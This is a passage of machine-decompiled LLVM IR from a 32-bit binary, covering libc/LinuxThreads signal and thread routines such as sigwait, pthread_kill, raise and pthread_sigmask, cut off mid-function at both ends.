  %tmp22 = icmp slt i32 %arg1, 1
  %tmp23 = icmp eq i1 %tmp22, false
  br i1 %tmp23, label %dec_label_pc_805766f, label %dec_label_pc_80575ed

dec_label_pc_80575ed:                             ; preds = %dec_label_pc_80575e5, %dec_label_pc_80575dd
  %v1_80575ef = icmp eq i32* %arg2, null
  %.pre = ptrtoint i32* %stack_var_-156 to i32
  br i1 %v1_80575ef, label %dec_label_pc_80575ed.dec_label_pc_8057638_crit_edge, label %dec_label_pc_80575f3

dec_label_pc_80575ed.dec_label_pc_8057638_crit_edge: ; preds = %dec_label_pc_80575ed
  br label %dec_label_pc_8057638

dec_label_pc_80575f3:                             ; preds = %dec_label_pc_80575ed
  store i32 %.pre, i32* @esi, align 4
  %v3_80575ff = bitcast i32* %stack_var_-156 to i16*
  %v4_80575ff = call i32 @memcpy(i16* %v3_80575ff, i32 %tmp9, i32 140)
  %v2_8057607 = load i32, i32* %arg2, align 4
  %tmp25 = or i32 %v2_8057607, 1
  %tmp26 = icmp eq i32 %tmp25, 1
  br i1 %tmp26, label %dec_label_pc_8057634, label %dec_label_pc_805760c

dec_label_pc_805760c:                             ; preds = %dec_label_pc_80575f3
  %tmp24 = icmp slt i32 %arg1, 1
  br i1 %tmp24, label %dec_label_pc_8057634, label %dec_label_pc_8057610

dec_label_pc_8057610:                             ; preds = %dec_label_pc_805760c
  %v1_8057610 = add i32 %arg1, -64
  %v3_8057610 = sub i32 63, %arg1
  %v4_8057610 = and i32 %v3_8057610, %arg1
  %v5_8057610 = icmp slt i32 %v4_8057610, 0
  %v6_8057610 = icmp eq i32 %v1_8057610, 0
  %v7_8057610 = icmp slt i32 %v1_8057610, 0
  %v3_8057613 = icmp eq i1 %v7_8057610, %v5_8057610
  %v4_8057613 = icmp eq i1 %v6_8057610, false
  %v5_8057613 = and i1 %v4_8057613, %v3_8057613
  br i1 %v5_8057613, label %dec_label_pc_8057634, label %dec_label_pc_8057615

dec_label_pc_8057615:                             ; preds = %dec_label_pc_8057610
  %v1_8057615 = add i32 %tmp9, 132
  %v2_8057615 = inttoptr i32 %v1_8057615 to i8*
  %v3_8057615 = load i8, i8* %v2_8057615, align 1
  %v4_8057615 = and i8 %v3_8057615, 4
  %v5_8057615 = icmp eq i8 %v4_8057615, 0
  %. = select i1 %v5_8057615, i32 134575438, i32 134575364
  store i32 %., i32* %stack_var_-156, align 4
  br label %dec_label_pc_8057638

dec_label_pc_8057634:                             ; preds = %dec_label_pc_8057610, %dec_label_pc_805760c, %dec_label_pc_80575f3
  br label %dec_label_pc_8057638

dec_label_pc_8057638:                             ; preds = %dec_label_pc_80575ed.dec_label_pc_8057638_crit_edge, %dec_label_pc_8057615, %dec_label_pc_8057634
  %v0_805763a = phi i32 [ 0, %dec_label_pc_80575ed.dec_label_pc_8057638_crit_edge ], [ %.pre, %dec_label_pc_8057615 ], [ %.pre, %dec_label_pc_8057634 ]
  %v3_805763c = inttoptr i32 %v0_805763a to i32*
  %v4_805763c = call i32 @__libc_sigaction(i32 %arg1, i32* %v3_805763c, i32 %.pre)
  store i32 -1, i32* @edx, align 4
  %v8_8057647 = icmp eq i32 %v4_805763c, -1
  br i1 %v8_8057647, label %dec_label_pc_8057678, label %dec_label_pc_805764a

dec_label_pc_805764a:                             ; preds = %dec_label_pc_8057638
  %v1_805764a = add i32 %arg1, -1
  %v6_8057650 = icmp ugt i32 %v1_805764a, 63
  br i1 %v6_8057650, label %dec_label_pc_8057676, label %dec_label_pc_8057652

dec_label_pc_8057652:                             ; preds = %dec_label_pc_805764a
  %v1_8057652 = icmp eq i32 %arg3, 0
  br i1 %v1_8057652, label %dec_label_pc_8057660, label %dec_label_pc_8057656

dec_label_pc_8057656:                             ; preds = %dec_label_pc_8057652
  %v1_8057656 = mul i32 %arg1, 4
  %v2_8057656 = add i32 %v1_8057656, ptrtoint (i32* @global_var_8078d60.650 to i32)
  %v3_8057656 = inttoptr i32 %v2_8057656 to i32*
  %v4_8057656 = load i32, i32* %v3_8057656, align 4
  %v2_805765d = inttoptr i32 %arg3 to i32*
  store i32 %v4_8057656, i32* %v2_805765d, align 4
  br label %dec_label_pc_8057660

dec_label_pc_8057660:                             ; preds = %dec_label_pc_8057652, %dec_label_pc_8057656
  br i1 %v1_80575ef, label %dec_label_pc_8057676, label %dec_label_pc_8057664

dec_label_pc_8057664:                             ; preds = %dec_label_pc_8057660
  %v2_8057664 = load i32, i32* %arg2, align 4
  %v2_8057666 = mul i32 %arg1, 4
  %v3_8057666 = add i32 %v2_8057666, ptrtoint (i32* @global_var_8078d60.650 to i32)
  %v4_8057666 = inttoptr i32 %v3_8057666 to i32*
  store i32 %v2_8057664, i32* %v4_8057666, align 4
  br label %dec_label_pc_8057676

dec_label_pc_805766f:                             ; preds = %dec_label_pc_80575e5, %dec_label_pc_80575d1, %entry
  store i32 22, i32* @edx, align 4
  br label %dec_label_pc_8057678

dec_label_pc_8057676:                             ; preds = %dec_label_pc_8057660, %dec_label_pc_805764a, %dec_label_pc_8057664
  store i32 0, i32* @edx, align 4
  br label %dec_label_pc_8057678

dec_label_pc_8057678:                             ; preds = %dec_label_pc_8057638, %dec_label_pc_805766f, %dec_label_pc_8057676
  %v0_805767e = phi i32 [ -1, %dec_label_pc_8057638 ], [ 22, %dec_label_pc_805766f ], [ 0, %dec_label_pc_8057676 ]
  store i32 %v0_80575a9, i32* @ebx, align 4
  store i32 %v0_80575a8, i32* @esi, align 4
  store i32 %v0_80575a7, i32* @edi, align 4
  ret i32 %v0_805767e

; uselistorder directives
  uselistorder i32 %v1_8057610, { 1, 0 }
  uselistorder i32 %.pre, { 0, 3, 2, 1 }
  uselistorder i1 %v1_80575ef, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 2, 0 }
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %arg1, { 9, 8, 6, 7, 3, 11, 10, 4, 5, 0, 1, 2, 12 }
  uselistorder label %dec_label_pc_8057678, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8057676, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057660, { 1, 0 }
  uselistorder label %dec_label_pc_8057638, { 2, 1, 0 }
}

define i32 @sigwait(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %stack_var_-440 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %v0_8057685 = load i32, i32* @edi, align 4
  %v0_8057686 = load i32, i32* @esi, align 4
  %v0_8057687 = load i32, i32* @ebx, align 4
  store i32 1, i32* @esi, align 4
  %v3_8057693 = call i32 @thread_self.2(i32 %v0_8057687, i32 %v0_8057686, i32 %v0_8057685)
  store i32 %arg1, i32* @edi, align 4
  %v2_80576a9 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_80576a9, i32* @ebx, align 4
  %v1_80576b1 = call i32 @sigfillset(i32 %v2_80576a9)
  %v1_80576bf = call i32 @__GI_sigdelset(i32 %v2_80576a9)
  %v0_805774e.pr = load i32, i32* @esi, align 4
  %v2_805771f = ptrtoint i32* %stack_var_-280 to i32
  %v2_8057726 = ptrtoint i32* %stack_var_-284 to i32
  %v7_805775126 = icmp sgt i32 %v0_805774e.pr, 65
  br i1 %v7_805775126, label %dec_label_pc_8057757, label %dec_label_pc_80576cc.lr.ph

dec_label_pc_80576cc.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_80576cc

dec_label_pc_80576cc:                             ; preds = %dec_label_pc_80576cc.lr.ph, %dec_label_pc_805774d
  %v0_80576ce28 = phi i32 [ %v0_805774e.pr, %dec_label_pc_80576cc.lr.ph ], [ %v1_805774d, %dec_label_pc_805774d ]
  %v3_80576d027 = phi i32 [ %v1_80576bf, %dec_label_pc_80576cc.lr.ph ], [ %v0_80577572, %dec_label_pc_805774d ]
  %v0_80576cf = load i32, i32* @edi, align 4
  %v4_80576d0 = call i32 @sigismember(i32 %v0_80576cf, i32 %v0_80576ce28, i32 %v3_80576d027, i32 %v3_80576d027)
  %v1_80576d8 = icmp eq i32 %v4_80576d0, 0
  br i1 %v1_80576d8, label %dec_label_pc_805774d, label %dec_label_pc_80576dc

dec_label_pc_80576dc:                             ; preds = %dec_label_pc_80576cc
  %v0_80576dc = load i32, i32* @esi, align 4
  %v1_80576dc = load i32, i32* @global_var_8074528.652, align 8
  %v12_80576dc = icmp eq i32 %v0_80576dc, %v1_80576dc
  br i1 %v12_80576dc, label %dec_label_pc_805774d, label %dec_label_pc_80576e4

dec_label_pc_80576e4:                             ; preds = %dec_label_pc_80576dc
  %v1_80576e4 = load i32, i32* @global_var_807452c.636, align 4
  %v12_80576e4 = icmp eq i32 %v0_80576dc, %v1_80576e4
  br i1 %v12_80576e4, label %dec_label_pc_805774d, label %dec_label_pc_80576ec

dec_label_pc_80576ec:                             ; preds = %dec_label_pc_80576e4
  %v1_80576ec = load i32, i32* @global_var_8074530.627, align 16
  %v12_80576ec = icmp eq i32 %v0_80576dc, %v1_80576ec
  br i1 %v12_80576ec, label %dec_label_pc_805774d, label %dec_label_pc_80576f4

dec_label_pc_80576f4:                             ; preds = %dec_label_pc_80576ec
  %v1_80576ff = call i32 @__GI_sigdelset(i32 %v2_80576a9)
  %v0_8057707 = load i32, i32* @esi, align 4
  %v1_8057707 = mul i32 %v0_8057707, 4
  %v2_8057707 = add i32 %v1_8057707, ptrtoint (i32* @global_var_8078d60.650 to i32)
  %v3_8057707 = inttoptr i32 %v2_8057707 to i32*
  %v4_8057707 = load i32, i32* %v3_8057707, align 4
  %tmp29 = or i32 %v4_8057707, 1
  %tmp30 = icmp eq i32 %tmp29, 1
  br i1 %tmp30, label %dec_label_pc_8057711, label %dec_label_pc_805774d

dec_label_pc_8057711:                             ; preds = %dec_label_pc_80576f4
  store i32 ptrtoint (i32* @global_var_80574c4.653 to i32), i32* %stack_var_-284, align 4
  store i32 %v2_8057726, i32* @ebx, align 4
  %v1_805772e = call i32 @sigemptyset(i32 %v2_805771f)
  %v0_8057744 = load i32, i32* @esi, align 4
  %v4_8057745 = call i32 @__GI_sigaction(i32 %v0_8057744, i32* nonnull %stack_var_-284, i32 0)
  br label %dec_label_pc_805774d

dec_label_pc_805774d:                             ; preds = %dec_label_pc_80576f4, %dec_label_pc_80576ec, %dec_label_pc_80576e4, %dec_label_pc_80576dc, %dec_label_pc_80576cc, %dec_label_pc_8057711
  %v0_80577572 = phi i32 [ %v1_80576ff, %dec_label_pc_80576f4 ], [ %v4_80576d0, %dec_label_pc_80576ec ], [ %v4_80576d0, %dec_label_pc_80576e4 ], [ %v4_80576d0, %dec_label_pc_80576dc ], [ 0, %dec_label_pc_80576cc ], [ %v4_8057745, %dec_label_pc_8057711 ]
  %v0_805774d = load i32, i32* @esi, align 4
  %v1_805774d = add i32 %v0_805774d, 1
  store i32 %v1_805774d, i32* @esi, align 4
  %v7_8057751 = icmp sgt i32 %v1_805774d, 65
  br i1 %v7_8057751, label %dec_label_pc_8057757, label %dec_label_pc_80576cc

dec_label_pc_8057757:                             ; preds = %dec_label_pc_805774d, %entry
  %v2_805775b = ptrtoint i32* %stack_var_-440 to i32
  %v3_8057760 = call i32 @__sigsetjmp(i32 %v2_805775b, i32* inttoptr (i32 1 to i32*))
  %v1_8057768 = icmp eq i32 %v3_8057760, 0
  %v1_805776a = icmp eq i1 %v1_8057768, false
  br i1 %v1_805776a, label %dec_label_pc_8057757.dec_label_pc_80577c0_crit_edge, label %dec_label_pc_805776c

dec_label_pc_8057757.dec_label_pc_80577c0_crit_edge: ; preds = %dec_label_pc_8057757
  %.pre = add i32 %v3_8057693, 40
  %.pre3 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_80577c0

dec_label_pc_805776c:                             ; preds = %dec_label_pc_8057757
  %v2_8057777 = add i32 %v3_8057693, 40
  %v3_8057777 = inttoptr i32 %v2_8057777 to i32*
  store i32 %v2_805775b, i32* %v3_8057777, align 4
  %v1_8057781 = add i32 %v3_8057693, 66
  %v2_8057781 = inttoptr i32 %v1_8057781 to i8*
  %v3_8057781 = load i8, i8* %v2_8057781, align 1
  %v4_8057781 = icmp eq i8 %v3_8057781, 0
  br i1 %v4_8057781, label %dec_label_pc_8057794, label %dec_label_pc_8057787

dec_label_pc_8057787:                             ; preds = %dec_label_pc_805776c
  %v1_805778e = add i32 %v3_8057693, 64
  %v2_805778e = inttoptr i32 %v1_805778e to i8*
  %v3_805778e = load i8, i8* %v2_805778e, align 1
  %v4_805778e = icmp eq i8 %v3_805778e, 0
  br i1 %v4_805778e, label %dec_label_pc_80577c0, label %dec_label_pc_8057794

dec_label_pc_8057794:                             ; preds = %dec_label_pc_8057787, %dec_label_pc_805776c
  %v1_805779b = add i32 %v3_8057693, 32
  %v2_805779b = inttoptr i32 %v1_805779b to i32*
  store i32 0, i32* %v2_805779b, align 4
  %v1_80577ac = add i32 %v3_8057693, 88
  %v2_80577ac = inttoptr i32 %v1_80577ac to i8*
  store i8 1, i8* %v2_80577ac, align 1
  %v1_80577b8 = bitcast i32* %stack_var_-144 to %_TYPEDEF_sigset_t*
  %v2_80577b8 = call i32 @__libc_sigsuspend(%_TYPEDEF_sigset_t* %v1_80577b8)
  br label %dec_label_pc_80577c0

dec_label_pc_80577c0:                             ; preds = %dec_label_pc_8057757.dec_label_pc_80577c0_crit_edge, %dec_label_pc_8057787, %dec_label_pc_8057794
  %v2_80577c7.pre-phi = phi i32* [ %.pre3, %dec_label_pc_8057757.dec_label_pc_80577c0_crit_edge ], [ %v3_8057777, %dec_label_pc_8057787 ], [ %v3_8057777, %dec_label_pc_8057794 ]
  store i32 0, i32* %v2_80577c7.pre-phi, align 4
  %v0_80577ce = call i32 @pthread_testcancel()
  %v1_80577e1 = add i32 %v3_8057693, 32
  %v2_80577e1 = inttoptr i32 %v1_80577e1 to i32*
  %v3_80577e1 = load i32, i32* %v2_80577e1, align 4
  store i32 %v3_80577e1, i32* %arg2, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_805774d, { 0, 2, 1 }
  uselistorder i32 %v4_80576d0, { 3, 2, 1, 0 }
  uselistorder i32 %v3_80576d027, { 1, 0 }
  uselistorder i32 %v3_8057693, { 6, 1, 3, 2, 4, 5, 0 }
  uselistorder i32 (i32)* @sigfillset, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @thread_self.2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80577c0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805774d, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_80576cc, { 1, 0 }
}

define i32 @pthread_kill(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_80577f2 = load i32, i32* @esi, align 4
  %v0_80577f3 = load i32, i32* @ebx, align 4
  store i32 0, i32* @edx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80577ff = urem i32 %arg1, 1024
  %v2_8057804 = mul nuw nsw i32 %v1_80577ff, 16
  %v1_8057807 = add i32 %v2_8057804, ptrtoint (i32* @global_var_8070140.628 to i32)
  store i32 %v1_8057807, i32* @esi, align 4
  store i32 %v1_8057807, i32* @eax, align 4
  %v1_805780f = call i32 @__pthread_lock(i32 %v0_80577f3)
  %v0_8057814 = load i32, i32* @esi, align 4
  %v1_8057814 = add i32 %v0_8057814, 8
  %v2_8057814 = inttoptr i32 %v1_8057814 to i32*
  %v3_8057814 = load i32, i32* %v2_8057814, align 4
  %v1_8057817 = icmp eq i32 %v3_8057814, 0
  br i1 %v1_8057817, label %dec_label_pc_8057820, label %dec_label_pc_805781b

dec_label_pc_805781b:                             ; preds = %entry
  %v1_805781b = add i32 %v3_8057814, 16
  %v2_805781b = inttoptr i32 %v1_805781b to i32*
  %v3_805781b = load i32, i32* %v2_805781b, align 4
  %v4_805781b = load i32, i32* @ebx, align 4
  %v15_805781b = icmp eq i32 %v3_805781b, %v4_805781b
  br i1 %v15_805781b, label %dec_label_pc_8057833, label %dec_label_pc_8057820

dec_label_pc_8057820:                             ; preds = %dec_label_pc_805781b, %entry
  store i32 %v0_8057814, i32* %stack_var_-28, align 4
  %v1_8057824 = inttoptr i32 %v0_8057814 to i32*
  %v2_8057824 = call i32 @__pthread_unlock(i32* %v1_8057824)
  br label %dec_label_pc_805785a

dec_label_pc_8057833:                             ; preds = %dec_label_pc_805781b
  %v1_8057836 = add i32 %v3_8057814, 20
  %v2_8057836 = inttoptr i32 %v1_8057836 to i32*
  %v3_8057836 = load i32, i32* %v2_8057836, align 4
  store i32 %v3_8057836, i32* @ebx, align 4
  store i32 %v0_8057814, i32* %stack_var_-28, align 4
  %v1_805783a = inttoptr i32 %v0_8057814 to i32*
  %v2_805783a = call i32 @__pthread_unlock(i32* %v1_805783a)
  %v0_8057845 = load i32, i32* @ebx, align 4
  store i32 %v0_8057845, i32* %stack_var_-28, align 4
  %v2_8057846 = call i32 @kill(i32 %v0_8057845, i32 %arg2)
  %v8_8057850 = icmp eq i32 %v2_8057846, -1
  %v1_8057851 = icmp eq i1 %v8_8057850, false
  br i1 %v1_8057851, label %dec_label_pc_805785a, label %dec_label_pc_8057853

dec_label_pc_8057853:                             ; preds = %dec_label_pc_8057833
  %v0_8057853 = load i32, i32* %stack_var_-28, align 4
  %v1_8057853 = call i32 @__errno_location(i32 %v0_8057853)
  %v1_8057858 = inttoptr i32 %v1_8057853 to i32*
  %v2_8057858 = load i32, i32* %v1_8057858, align 4
  br label %dec_label_pc_805785a

dec_label_pc_805785a:                             ; preds = %dec_label_pc_8057833, %dec_label_pc_8057820, %dec_label_pc_8057853
  %v0_805785a = phi i32 [ 0, %dec_label_pc_8057833 ], [ 3, %dec_label_pc_8057820 ], [ %v2_8057858, %dec_label_pc_8057853 ]
  store i32 %v0_80577f2, i32* @esi, align 4
  ret i32 %v0_805785a

; uselistorder directives
  uselistorder i32 %v3_8057814, { 1, 0, 2 }
  uselistorder i32 %v0_8057814, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_805785a, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057860 = load i32, i32* @ebx, align 4
  store i32 %v0_8057860, i32* %stack_var_-4, align 4
  %v1_8057864 = call i32 @__GI_pthread_self(i32 %v0_8057860)
  %v0_8057869 = load i32, i32* @ebx, align 4
  store i32 %v1_8057864, i32* %stack_var_-28, align 4
  %v4_8057870 = call i32 @pthread_kill(i32 %v1_8057864, i32 %arg1, i32 %v0_8057869, i32 %v0_8057869)
  %v1_805787c = icmp eq i32 %v4_8057870, 0
  br i1 %v1_805787c, label %dec_label_pc_805788a, label %dec_label_pc_8057880

dec_label_pc_8057880:                             ; preds = %entry
  %v0_8057880 = load i32, i32* %stack_var_-28, align 4
  %v1_8057880 = call i32 @__errno_location(i32 %v0_8057880)
  %v2_8057885 = inttoptr i32 %v1_8057880 to i32*
  store i32 %v4_8057870, i32* %v2_8057885, align 4
  br label %dec_label_pc_805788a

dec_label_pc_805788a:                             ; preds = %entry, %dec_label_pc_8057880
  %v0_805788d = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_8057880 ]
  %v2_805788c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805788c, i32* @ebx, align 4
  ret i32 %v0_805788d

; uselistorder directives
  uselistorder i32 %v1_8057864, { 1, 0 }
  uselistorder label %dec_label_pc_805788a, { 1, 0 }
}

define i32 @pthread_sigmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_80578a4 = icmp eq i32 %arg2, 0
  br i1 %v1_80578a4, label %entry.dec_label_pc_8057916_crit_edge, label %dec_label_pc_80578a8

entry.dec_label_pc_8057916_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8057916

dec_label_pc_80578a8:                             ; preds = %entry
  %v2_80578a8 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_80578a8, i32* @ebx, align 4
  store i32 %v2_80578a8, i32* %stack_var_-156, align 4
  %v3_80578b4 = bitcast i32* %stack_var_-136 to i16*
  %v4_80578b4 = call i32 @memcpy(i16* %v3_80578b4, i32 %arg2, i32 128)
  %v5_80578bc = icmp eq i32 %arg1, 0
  %v9_80578bc = icmp eq i32 %arg1, 1
  br i1 %v9_80578bc, label %dec_label_pc_80578fd, label %dec_label_pc_80578c1

dec_label_pc_80578c1:                             ; preds = %dec_label_pc_80578a8
  %v9_80578c1 = icmp eq i32 %arg1, 2
  br i1 %v9_80578c1, label %dec_label_pc_80578cc, label %dec_label_pc_80578c6

dec_label_pc_80578c6:                             ; preds = %dec_label_pc_80578c1
  br i1 %v5_80578bc, label %dec_label_pc_80578de, label %dec_label_pc_8057912

dec_label_pc_80578cc:                             ; preds = %dec_label_pc_80578c1
  %v0_80578ce = load i32, i32* @global_var_8074528.652, align 8
  store i32 %v2_80578a8, i32* %stack_var_-156, align 4
  %v2_80578d5 = call i32 @__GI_sigaddset(i32 %v2_80578a8, i32 %v0_80578ce)
  br label %dec_label_pc_80578e0

dec_label_pc_80578de:                             ; preds = %dec_label_pc_80578c6
  br label %dec_label_pc_80578e0

dec_label_pc_80578e0:                             ; preds = %dec_label_pc_80578cc, %dec_label_pc_80578de
  store i32 %v2_80578a8, i32* %stack_var_-156, align 4
  %v1_80578e7 = call i32 @__GI_sigdelset(i32 %v2_80578a8)
  %v0_80578ec = load i32, i32* @global_var_8074530.627, align 16
  %tmp20 = icmp slt i32 %v0_80578ec, 1
  br i1 %tmp20, label %dec_label_pc_8057912, label %dec_label_pc_80578f8

dec_label_pc_80578f8:                             ; preds = %dec_label_pc_80578e0
  br label %dec_label_pc_8057905

dec_label_pc_80578fd:                             ; preds = %dec_label_pc_80578a8
  br label %dec_label_pc_8057905

dec_label_pc_8057905:                             ; preds = %dec_label_pc_80578f8, %dec_label_pc_80578fd
  store i32 %v2_80578a8, i32* %stack_var_-156, align 4
  %v1_8057906 = call i32 @__GI_sigdelset(i32 %v2_80578a8)
  br label %dec_label_pc_8057916

dec_label_pc_8057912:                             ; preds = %dec_label_pc_80578c6, %dec_label_pc_80578e0
  br label %dec_label_pc_8057916

dec_label_pc_8057916:                             ; preds = %entry.dec_label_pc_8057916_crit_edge, %dec_label_pc_8057905, %dec_label_pc_8057912
  %v0_805791e = phi i32 [ 0, %entry.dec_label_pc_8057916_crit_edge ], [ %v2_80578a8, %dec_label_pc_8057905 ], [ %v2_80578a8, %dec_label_pc_8057912 ]
  store i32 %arg1, i32* %stack_var_-156, align 4
  %v3_8057920 = inttoptr i32 %v0_805791e to %_TYPEDEF_sigset_t*
  %v4_8057920 = call i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %v3_8057920, i32 %arg3)
  %v8_805792a = icmp eq i32 %v4_8057920, -1
  %v1_805792b = icmp eq i1 %v8_805792a, false
  br i1 %v1_805792b, label %dec_label_pc_8057934, label %dec_label_pc_805792d

dec_label_pc_805792d:                             ; preds = %dec_label_pc_8057916
  %v0_805792d = load i32, i32* %stack_var_-156, align 4
  %v1_805792d = call i32 @__errno_location(i32 %v0_805792d)
  %v1_8057932 = inttoptr i32 %v1_805792d to i32*
  %v2_8057932 = load i32, i32* %v1_8057932, align 4
  br label %dec_label_pc_8057934

dec_label_pc_8057934:                             ; preds = %dec_label_pc_8057916, %dec_label_pc_805792d
  %v0_805793a = phi i32 [ 0, %dec_label_pc_8057916 ], [ %v2_8057932, %dec_label_pc_805792d ]
  ret i32 %v0_805793a

; uselistorder directives
  uselistorder i32 %v2_80578a8, { 0, 1, 7, 6, 3, 2, 5, 4, 8, 9 }
  uselistorder i32 %arg1, { 3, 2, 0, 1, 4, 5 }
  uselistorder label %dec_label_pc_8057934, { 1, 0 }
  uselistorder label %dec_label_pc_8057916, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8057912, { 1, 0 }
  uselistorder label %dec_label_pc_8057905, { 1, 0 }
  uselistorder label %dec_label_pc_80578e0, { 1, 0 }
}

define i32 @wait_node_dequeue() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8057944 = load i32, i32* @edx, align 4
  %v1_8057944 = load i32, i32* @eax, align 4
  %v12_8057944 = icmp eq i32 %v0_8057944, %v1_8057944
  %v1_8057946 = icmp eq i1 %v12_8057944, false
  %v0_8057961.pre = load i32, i32* @ecx, align 4
  br i1 %v1_8057946, label %dec_label_pc_8057961, label %dec_label_pc_8057948

dec_label_pc_8057948:                             ; preds = %entry
  %v1_8057948 = inttoptr i32 %v0_8057961.pre to i32*
  %v2_8057948 = load i32, i32* %v1_8057948, align 4
  store i32 %v2_8057948, i32* %ebx.global-to-local, align 4
  %v1_805794c = inttoptr i32 %v0_8057944 to i32*
  %v2_805794c = load i32, i32* %v1_805794c, align 4
  %v15_805794c = icmp eq i32 %v0_8057961.pre, %v2_805794c
  %v22_805794c = select i1 %v15_805794c, i32 %v2_8057948, i32 %v2_805794c
  store i32 %v22_805794c, i32* %v1_805794c, align 4
  %v1_8057950 = zext i1 %v15_805794c to i32
  %v2_8057950 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8057950 = and i32 %v2_8057950, -256
  %v4_8057950 = or i32 %v3_8057950, %v1_8057950
  store i32 %v4_8057950, i32* %ebx.global-to-local, align 4
  %v4_8057953 = icmp eq i1 %v15_805794c, false
  br i1 %v4_8057953, label %dec_label_pc_805795b.preheader, label %dec_label_pc_8057965

dec_label_pc_805795b.preheader:                   ; preds = %dec_label_pc_8057948
  %v0_805795b.pre = load i32, i32* @edx, align 4
  %v0_805795d.pre = load i32, i32* @ecx, align 4
  %v1_805795b7 = inttoptr i32 %v0_805795b.pre to i32*
  %v2_805795b8 = load i32, i32* %v1_805795b7, align 4
  %v12_805795d10 = icmp eq i32 %v0_805795d.pre, %v2_805795b8
  %v1_805795f11 = icmp eq i1 %v12_805795d10, false
  br i1 %v1_805795f11, label %dec_label_pc_8057959, label %dec_label_pc_8057961.loopexit

dec_label_pc_8057959:                             ; preds = %dec_label_pc_805795b.preheader, %dec_label_pc_8057959
  %v2_805795b12 = phi i32 [ %v2_805795b, %dec_label_pc_8057959 ], [ %v2_805795b8, %dec_label_pc_805795b.preheader ]
  %v1_805795b = inttoptr i32 %v2_805795b12 to i32*
  %v2_805795b = load i32, i32* %v1_805795b, align 4
  %v12_805795d = icmp eq i32 %v0_805795d.pre, %v2_805795b
  %v1_805795f = icmp eq i1 %v12_805795d, false
  br i1 %v1_805795f, label %dec_label_pc_8057959, label %dec_label_pc_8057961.loopexit

dec_label_pc_8057961.loopexit:                    ; preds = %dec_label_pc_8057959, %dec_label_pc_805795b.preheader
  %v0_805795b.lcssa = phi i32 [ %v0_805795b.pre, %dec_label_pc_805795b.preheader ], [ %v2_805795b12, %dec_label_pc_8057959 ]
  br label %dec_label_pc_8057961

dec_label_pc_8057961:                             ; preds = %entry, %dec_label_pc_8057961.loopexit
  %v1_8057963 = phi i32 [ %v0_805795b.lcssa, %dec_label_pc_8057961.loopexit ], [ %v0_8057944, %entry ]
  %v0_8057961 = phi i32 [ %v0_805795d.pre, %dec_label_pc_8057961.loopexit ], [ %v0_8057961.pre, %entry ]
  %v1_8057961 = inttoptr i32 %v0_8057961 to i32*
  %v2_8057961 = load i32, i32* %v1_8057961, align 4
  %v2_8057963 = inttoptr i32 %v1_8057963 to i32*
  store i32 %v2_8057961, i32* %v2_8057963, align 4
  br label %dec_label_pc_8057965

dec_label_pc_8057965:                             ; preds = %dec_label_pc_8057948, %dec_label_pc_8057961
  %v2_8057965 = load i32, i32* %stack_var_-8, align 4
  ret i32 %v2_8057965

; uselistorder directives
  uselistorder i32 %v2_805795b8, { 1, 0 }
  uselistorder i32 %v0_805795d.pre, { 2, 1, 0 }
  uselistorder i1 %v15_805794c, { 1, 2, 0 }
  uselistorder i32 %v2_805794c, { 1, 0 }
  uselistorder i32 %v0_8057961.pre, { 1, 0, 2 }
  uselistorder i32 %v0_8057944, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8057965, { 1, 0 }
  uselistorder label %dec_label_pc_8057961, { 1, 0 }
  uselistorder label %dec_label_pc_8057959, { 1, 0 }
}

define i32 @__pthread_acquire(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v0_8057968 = load i32, i32* @esi, align 4
  %v0_8057969 = load i32, i32* @ebx, align 4
  %v0_805796d = load i32, i32* @eax, align 4
  store i32 %v0_805796d, i32* @ebx, align 4
  store i32 0, i32* @esi, align 4
  %v2_8057996 = ptrtoint i32* %stack_var_-16 to i32
  %v1_80579a811 = inttoptr i32 %v0_805796d to i32*
  %v2_80579a812 = load i32, i32* %v1_80579a811, align 4
  store i32 1, i32* %v1_80579a811, align 4
  %v1_80579aa13 = icmp eq i32 %v2_80579a812, 0
  %v1_80579ac14 = icmp eq i1 %v1_80579aa13, false
  br i1 %v1_80579ac14, label %dec_label_pc_8057973, label %dec_label_pc_80579ae

dec_label_pc_8057973:                             ; preds = %entry, %dec_label_pc_80579a3.backedge
  %v0_8057973 = load i32, i32* @esi, align 4
  %v1_8057973 = add i32 %v0_8057973, -49
  %v6_8057973 = sub i32 48, %v0_8057973
  %v7_8057973 = and i32 %v6_8057973, %v0_8057973
  %v8_8057973 = icmp slt i32 %v7_8057973, 0
  %v9_8057973 = icmp eq i32 %v1_8057973, 0
  %v10_8057973 = icmp slt i32 %v1_8057973, 0
